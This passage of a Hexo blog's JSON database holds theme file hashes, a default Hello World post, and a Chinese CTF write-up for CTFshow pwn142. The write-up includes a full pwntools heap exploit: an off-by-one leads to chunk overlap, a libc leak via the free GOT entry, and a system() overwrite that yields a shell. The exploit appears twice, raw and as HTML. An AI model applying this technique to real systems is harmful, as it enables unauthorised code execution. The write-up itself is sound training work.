5f7249f365f2b89c0281057ce54","modified":1742824140681},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/common.pug","hash":"27fa75affebc6e84a487c62bceff783bde595256","modified":1742824140680},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/artalk.pug","hash":"187302dbc916852ff2fdf47061e272c061611dda","modified":1742824140680},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/github-issues.pug","hash":"72e2970b23570e308f8af5d8ba8e5e3321d01bbf","modified":1742824140681},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/index.pug","hash":"a7c07dbc1e970a5b247091458e1ee9b144a3366d","modified":1742824140681},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/valine.pug","hash":"d376ec17fb19fcdcf0d2ad71330190146d3af879","modified":1742824140682},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/remark42.pug","hash":"34edfebf0cace0852806be774910ccb0e0914650","modified":1742824140681},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/twikoo-comment.pug","hash":"d2e12a9fc302a4efe52c90d44896fbd73e193a1f","modified":1742824140682},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/waline.pug","hash":"ec6c685080634ac46ffbea1b8f10313388888f43","modified":1742824140682},{"_id":"themes/butterfly/layout/includes/third-party/share/addtoany.pug","hash":"5c944052280c5ed046d2cfeb54b0da8876af0ec6","modified":1742824140685},{"_id":"themes/butterfly/layout/includes/third-party/share/index.pug","hash":"e51e896ccb13900de38dc81cf44dc789e2418a12","modified":1742824140685},{"_id":"themes/butterfly/layout/includes/third-party/share/share-js.pug","hash":"efef352c1d122409575386bf3894dce8e87032e2","modified":1742824140685},{"_id":"themes/butterfly/layout/includes/third-party/search/algolia.pug","hash":"7f0ede1cd3fed2669c94a8e1b21bc0b183f310b8","modified":1742824140683},{"_id":"themes/butterfly/layout/includes/third-party/search/index.pug","hash":"f8557548d2ad8dd149c562193991c6c6cda02415","modified":1742824140683},{"_id":"themes/butterfly/source/css/_highlight/highlight/diff.styl","hash":"9f02598b5e4296aec6470639d4bac4c9ac46392e","modified":1742824140703},{"_id":"themes/butterfly/layout/includes/third-party/search/local-search.pug","hash":"2622b4cf9189fa23e4a422aaf9ef272e4f2c6137","modified":1742824140683},{"_id":"themes/butterfly/source/css/_highlight/highlight/index.styl","hash":"ef52ebf1e8e751a412f9456fdaeee7d88afd9a72","modified":1742824140703},{"_id":"themes/butterfly/layout/includes/third-party/search/docsearch.pug","hash":"013756ff3363344987cc00fc9bd833baf193c341","modified":1742824140683},{"_id":"themes/butterfly/source/css/_highlight/prismjs/diff.styl","hash":"077ec530831be1d80e93da380406b9f5abd0918a","modified":1742824140704},{"_id":"themes/butterfly/source/css/_highlight/prismjs/line-number.styl","hash":"de4bb5fc2dfca368b35e4c1109c92f7abc9e2245","modified":1742824140704},{"_id":"themes/butterfly/source/css/_highlight/prismjs/index.styl","hash":"1883c91d43bff10aae55122a21e0b064b6f5c9dd","modified":1742824140704},{"_id":"themes/butterfly/source/img/butterfly-icon.png","hash":"f5dd732fed5c3bcd4aa76bac3441bac8485fb432","modified":1742824140720}],"Category":[],"Data":[],"Page":[{"title":"分类","date":"2022-02-23T09:56:00.000Z","aside":false,"top_img":false,"type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2022-02-23 17:56:00\naside: false\ntop_img: false\ntype: \"categories\"\n---","updated":"2025-03-24T15:45:16.066Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cm8nyp9i80000bcmy5aqnculv","content":"","excerpt":"","more":""},{"title":"标签","date":"2021-04-06T04:01:51.000Z","type":"tags","comments":0,"top_img":false,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2021-04-06 12:01:51\ntype: \"tags\"\ncomments: false\ntop_img: false\n---","updated":"2025-03-24T15:46:18.630Z","path":"tags/index.html","layout":"page","_id":"cm8nyp9ic0002bcmy04xv0d7l","content":"","excerpt":"","more":""}],"Post":[{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2025-03-24T12:13:14.377Z","updated":"2025-03-24T11:50:40.807Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9i90001bcmybx4m4411","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"CTFshow pwn142","_content":"# CTFshow pwn142（堆风水？|堆块重叠）\n## ida分析\n### menu\n![f7cffd67496a436bb6cad9ebfd00decf.png](https://img.picui.cn/free/2025/03/10/67ce92f6ce057.png)\n四个功能：创建、编辑、打印、删除\n\n### create分析\n![bef06bdf0a3923914eb6b5c389c43e74.png](https://img.picui.cn/free/2025/03/10/67ce936bbb0b1.png)\n1.先申清一个0x10的堆块，里面存放size，和接下来申清的堆块的地址\n2.利用存放的地址，寻找堆块位置输入\n\n### edit分析\n![1741591628419.png](https://img.picui.cn/free/2025/03/10/67ce944e433a1.png)\n1.这里存在一个off-by-one的漏洞，可以造成堆块的重叠\n\n### show分析\n![1741591738926.png](https://img.picui.cn/free/2025/03/10/67ce94bc5a792.png)\n1.可以通过printf泄露libc\n\n\n### delete分析\n![1741591782030.png](https://img.picui.cn/free/2025/03/10/67ce94e7855ee.png)\n1.没有留下uaf漏洞\n\n## 构造思路\n1.首先创建两个大小分别为0x18和0x10的堆块。此时会有四个堆块，通过`edit 0` 溢出到下一个堆块的size为0x41，造成堆块的重叠。同时将0 号堆块的内容设置为`/bin/sh\\x00`\n2.接着`delete 1` ,再申请一块大小为0x30的堆块。\n3.此时，在creat时，会将原先第四个堆块先申请给0x10的堆块。然后申清0x30时，原先的第三、第四堆块都分配。也就是我们可以通过`edit 1`修改头部的chunk。\n4.如果creat时，将chunk的内容填充为free_got， 就可以使用`show 1`泄露libc。并且`edit 1`可以修改got 表的内容\n\n\n## exp\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28206\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"Size of Heap : \")\n    io.sendline(str(size))\n    io.recvuntil(\"Content of heap:\")\n    io.sendline(content)\n\ndef edit(idx,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n    io.recvuntil(\"Content of heap : \")\n    io.sendline(content)\n\ndef show(idx):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n\ndef delete(idx):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"4\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n\nfree_got=elf.got[\"free\"]\nadd(0x18,b'aaaa') #0\nadd(0x10,b'bbbb') #1\npayload=b'/bin/sh\\x00'.ljust(0x18,b'\\x61')+b'\\x41'\nedit(0,payload)\n#gdb.attach(io)\ndelete(1)\nadd(0x30,p64(0)*4+p64(0x30)+p64(free_got))\nshow(1)\n\nio.recvuntil(\"Content : \")\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('free-{}'.format(hex(free)))\nlibc=finder(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\nedit(1,p64(system))\ndelete(0)\n\nio.interactive()\n```","source":"_posts/heap/CTFshow pwn142.md","raw":"---\ntitle: CTFshow pwn142\n---\n# CTFshow pwn142（堆风水？|堆块重叠）\n## ida分析\n### menu\n![f7cffd67496a436bb6cad9ebfd00decf.png](https://img.picui.cn/free/2025/03/10/67ce92f6ce057.png)\n四个功能：创建、编辑、打印、删除\n\n### create分析\n![bef06bdf0a3923914eb6b5c389c43e74.png](https://img.picui.cn/free/2025/03/10/67ce936bbb0b1.png)\n1.先申清一个0x10的堆块，里面存放size，和接下来申清的堆块的地址\n2.利用存放的地址，寻找堆块位置输入\n\n### edit分析\n![1741591628419.png](https://img.picui.cn/free/2025/03/10/67ce944e433a1.png)\n1.这里存在一个off-by-one的漏洞，可以造成堆块的重叠\n\n### show分析\n![1741591738926.png](https://img.picui.cn/free/2025/03/10/67ce94bc5a792.png)\n1.可以通过printf泄露libc\n\n\n### delete分析\n![1741591782030.png](https://img.picui.cn/free/2025/03/10/67ce94e7855ee.png)\n1.没有留下uaf漏洞\n\n## 构造思路\n1.首先创建两个大小分别为0x18和0x10的堆块。此时会有四个堆块，通过`edit 0` 溢出到下一个堆块的size为0x41，造成堆块的重叠。同时将0 号堆块的内容设置为`/bin/sh\\x00`\n2.接着`delete 1` ,再申请一块大小为0x30的堆块。\n3.此时，在creat时，会将原先第四个堆块先申请给0x10的堆块。然后申清0x30时，原先的第三、第四堆块都分配。也就是我们可以通过`edit 1`修改头部的chunk。\n4.如果creat时，将chunk的内容填充为free_got， 就可以使用`show 1`泄露libc。并且`edit 1`可以修改got 表的内容\n\n\n## exp\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28206\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"Size of Heap : \")\n    io.sendline(str(size))\n    io.recvuntil(\"Content of heap:\")\n    io.sendline(content)\n\ndef edit(idx,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n    io.recvuntil(\"Content of heap : \")\n    io.sendline(content)\n\ndef show(idx):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n\ndef delete(idx):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"4\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(idx))\n\nfree_got=elf.got[\"free\"]\nadd(0x18,b'aaaa') #0\nadd(0x10,b'bbbb') #1\npayload=b'/bin/sh\\x00'.ljust(0x18,b'\\x61')+b'\\x41'\nedit(0,payload)\n#gdb.attach(io)\ndelete(1)\nadd(0x30,p64(0)*4+p64(0x30)+p64(free_got))\nshow(1)\n\nio.recvuntil(\"Content : \")\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('free-{}'.format(hex(free)))\nlibc=finder(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\nedit(1,p64(system))\ndelete(0)\n\nio.interactive()\n```","slug":"heap/CTFshow pwn142","published":1,"date":"2025-03-24T13:21:12.267Z","updated":"2025-03-24T14:37:07.170Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9ic0003bcmy0i7g2fqr","content":"<h1 id=\"CTFshow-pwn142（堆风水？-堆块重叠）\"><a href=\"#CTFshow-pwn142（堆风水？-堆块重叠）\" class=\"headerlink\" title=\"CTFshow pwn142（堆风水？|堆块重叠）\"></a>CTFshow pwn142（堆风水？|堆块重叠）</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"menu\"><a href=\"#menu\" class=\"headerlink\" title=\"menu\"></a>menu</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce92f6ce057.png\" alt=\"f7cffd67496a436bb6cad9ebfd00decf.png\"><br>四个功能：创建、编辑、打印、删除</p>\n<h3 id=\"create分析\"><a href=\"#create分析\" class=\"headerlink\" title=\"create分析\"></a>create分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce936bbb0b1.png\" alt=\"bef06bdf0a3923914eb6b5c389c43e74.png\"><br>1.先申清一个0x10的堆块，里面存放size，和接下来申清的堆块的地址<br>2.利用存放的地址，寻找堆块位置输入</p>\n<h3 id=\"edit分析\"><a href=\"#edit分析\" class=\"headerlink\" title=\"edit分析\"></a>edit分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce944e433a1.png\" alt=\"1741591628419.png\"><br>1.这里存在一个off-by-one的漏洞，可以造成堆块的重叠</p>\n<h3 id=\"show分析\"><a href=\"#show分析\" class=\"headerlink\" title=\"show分析\"></a>show分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce94bc5a792.png\" alt=\"1741591738926.png\"><br>1.可以通过printf泄露libc</p>\n<h3 id=\"delete分析\"><a href=\"#delete分析\" class=\"headerlink\" title=\"delete分析\"></a>delete分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce94e7855ee.png\" alt=\"1741591782030.png\"><br>1.没有留下uaf漏洞</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先创建两个大小分别为0x18和0x10的堆块。此时会有四个堆块，通过<code>edit 0</code> 溢出到下一个堆块的size为0x41，造成堆块的重叠。同时将0 号堆块的内容设置为<code>/bin/sh\\x00</code><br>2.接着<code>delete 1</code> ,再申请一块大小为0x30的堆块。<br>3.此时，在creat时，会将原先第四个堆块先申请给0x10的堆块。然后申清0x30时，原先的第三、第四堆块都分配。也就是我们可以通过<code>edit 1</code>修改头部的chunk。<br>4.如果creat时，将chunk的内容填充为free_got， 就可以使用<code>show 1</code>泄露libc。并且<code>edit 1</code>可以修改got 表的内容</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28206</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)+<span class=\"string\">b&#x27;\\x41&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0x30</span>)+p64(free_got))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=finder(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn142（堆风水？-堆块重叠）\"><a href=\"#CTFshow-pwn142（堆风水？-堆块重叠）\" class=\"headerlink\" title=\"CTFshow pwn142（堆风水？|堆块重叠）\"></a>CTFshow pwn142（堆风水？|堆块重叠）</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"menu\"><a href=\"#menu\" class=\"headerlink\" title=\"menu\"></a>menu</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce92f6ce057.png\" alt=\"f7cffd67496a436bb6cad9ebfd00decf.png\"><br>四个功能：创建、编辑、打印、删除</p>\n<h3 id=\"create分析\"><a href=\"#create分析\" class=\"headerlink\" title=\"create分析\"></a>create分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce936bbb0b1.png\" alt=\"bef06bdf0a3923914eb6b5c389c43e74.png\"><br>1.先申清一个0x10的堆块，里面存放size，和接下来申清的堆块的地址<br>2.利用存放的地址，寻找堆块位置输入</p>\n<h3 id=\"edit分析\"><a href=\"#edit分析\" class=\"headerlink\" title=\"edit分析\"></a>edit分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce944e433a1.png\" alt=\"1741591628419.png\"><br>1.这里存在一个off-by-one的漏洞，可以造成堆块的重叠</p>\n<h3 id=\"show分析\"><a href=\"#show分析\" class=\"headerlink\" title=\"show分析\"></a>show分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce94bc5a792.png\" alt=\"1741591738926.png\"><br>1.可以通过printf泄露libc</p>\n<h3 id=\"delete分析\"><a href=\"#delete分析\" class=\"headerlink\" title=\"delete分析\"></a>delete分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/10/67ce94e7855ee.png\" alt=\"1741591782030.png\"><br>1.没有留下uaf漏洞</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先创建两个大小分别为0x18和0x10的堆块。此时会有四个堆块，通过<code>edit 0</code> 溢出到下一个堆块的size为0x41，造成堆块的重叠。同时将0 号堆块的内容设置为<code>/bin/sh\\x00</code><br>2.接着<code>delete 1</code> ,再申请一块大小为0x30的堆块。<br>3.此时，在creat时，会将原先第四个堆块先申请给0x10的堆块。然后申清0x30时，原先的第三、第四堆块都分配。也就是我们可以通过<code>edit 1</code>修改头部的chunk。<br>4.如果creat时，将chunk的内容填充为free_got， 就可以使用<code>show 1</code>泄露libc。并且<code>edit 1</code>可以修改got 表的内容</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 